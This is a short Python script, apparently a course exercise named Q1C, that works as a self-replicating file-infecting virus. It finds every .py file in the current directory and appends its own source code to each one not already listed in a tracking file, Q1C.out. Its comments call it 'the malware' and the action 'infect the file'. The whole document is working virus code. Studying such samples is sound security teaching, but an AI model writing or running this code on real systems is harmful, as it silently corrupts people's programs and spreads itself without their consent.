import glob
Files = [f for f in glob.glob("*.py")] #create variable to check for viruses in files
OutputFile = 'Q1C.out' in [f for f in glob.glob("*.out")]

for f in Files:
    if OutputFile:
        virus = [line.strip() for line in open('Q1C.out', 'r').readlines()] #define virus
    else:
        with open('Q1C.out', 'w') as w:
            w.write('Q1C.py\n') #exclude Q1c.py because its the malware
            virus = ['Q1C.py']

    if f not in virus: #check if file is not infect
        Q1CLines = ['\n'] + open('Q1C.py', 'r').readlines()
        with open(f, 'a') as modify, open('Q1C.out', 'a') as out:
            for line in Q1CLines:
                modify.write(line)#infect the file with Q1C.py
            out.write(f + '\n')
